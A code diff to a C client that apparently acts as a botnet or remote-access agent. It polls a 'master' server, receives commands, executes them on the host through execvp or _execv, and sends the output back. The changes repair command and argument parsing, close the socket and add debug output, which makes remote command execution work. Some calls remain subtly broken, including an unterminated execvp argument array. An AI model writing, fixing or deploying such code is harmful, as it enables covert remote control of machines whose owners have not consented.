@@ -45,17 +45,31 @@ int main(int argc, char **argv){
             if (cmdlen) {
                 char *cmd = (char *)malloc(sizeof(char) * (cmdlen+1));
                 strncpy(cmd,resp+4,cmdlen);
-                cmd[cmdlen] = '\0';
                 char *found;
-                if (! (found = strchr(cmd,' '))) {
-                    uint32_t loc = (uint32_t)(found-cmd+1);
+                if ((found = strchr(cmd,' '))) {
+                    #ifdef CLIENT_DEBUG
+                        printf("cmd=%u\n",(uint32_t)cmd);
+                        printf("found=%u\n",(uint32_t)found);
+                    #endif
+                    uint32_t loc = (uint32_t)((found)-cmd+1);
+                    #ifdef CLIENT_DEBUG
+                        printf("loc=%u\n",loc);
+                    #endif
                     uint32_t arglen = (cmdlen-loc);
+                    #ifdef CLIENT_DEBUG
+                        printf("arglen=%u\n",arglen);
+                    #endif
                     char *args = (char *)malloc(sizeof(char) * (arglen+1));
-                    strncpy(args,found,arglen);
+                    strncpy(args,found+1,arglen);
+                    cmd[loc-1] = '\0';
                     args[arglen] = '\0';
-                    data = run_cmd(cmd,&args);
+                    data = run_cmd(cmd,args);
                     free(args);
                 } else {
+                    cmd[cmdlen] = '\0';
+                    #ifdef CLIENT_DEBUG
+                        printf("cmd=%u val:%s\n",(uint32_t)cmd,cmd);
+                    #endif
                    data = run_cmd(cmd,NULL);
                 }
                 free(cmd);
@@ -125,6 +139,7 @@ char *master_checkin(struct sockaddr_in master, char *data){
         if((recv_size = recv(s , server_reply , MASTER_RECV_SIZE , 0)) < 0) {
             puts("recv failed");
         }
+        close(s);
     #elif __windows__
         WSADATA wsa;
         SOCKET s;
@@ -170,7 +185,7 @@ char *get_os() {
     return run_cmd(ID_CMD,NULL);
 }
 
-char *run_cmd(char *cmd,char **param) {
+char *run_cmd(char *cmd,char *param) {
     int pipes[2];
     pid_t pid;
     char *buf = (char *)malloc(sizeof(char) * BUF_SIZE);
@@ -187,6 +202,7 @@ char *run_cmd(char *cmd,char **param) {
         return NULL; // fail
     }
 
+    char **args = (char **)malloc(sizeof(char *) * 2);
     if(pid == 0) {
         // TODO: FIX from direct exec to
         // pipe->dup2->exec shell->write to stdin->send \n to stdin->read stdout save results->return results
@@ -199,22 +215,29 @@ char *run_cmd(char *cmd,char **param) {
         close(pipes[1]);
         #if defined(__apple__) || defined(__linux__) || defined(__unix__)
             if (param) {
-                execvp(cmd,param);
+                args[0] = cmd;
+                args[1] = param;
+                execvp(cmd,args);
             } else {
                 execlp(cmd,"");
             }
         #elif __windows__
             _execv(cmd,param);
         #endif
+        exit(0);
     } else {
         close(pipes[1]);
         #ifdef CLIENT_DEBUG
             int nbytes = read(pipes[0], buf, BUF_SIZE);
-            printf("[run_cmd] CMD ran: %s, Params[0]: %s, Output (%d bytes): %s\n", cmd, param[0], nbytes, buf);
+            if (param) {
+               printf("[run_cmd] CMD ran: %s, Params: %s, Output (%d bytes): %s\n", cmd, param, nbytes, buf);
+            } else {
+               printf("[run_cmd] CMD ran: %s, Output (%d bytes): %s\n", cmd, nbytes, buf);
+            }
         #else
             read(pipes[0], buf, BUF_SIZE);
         #endif
-        wait(NULL);
     }
+    free(args);
     return buf;
 }
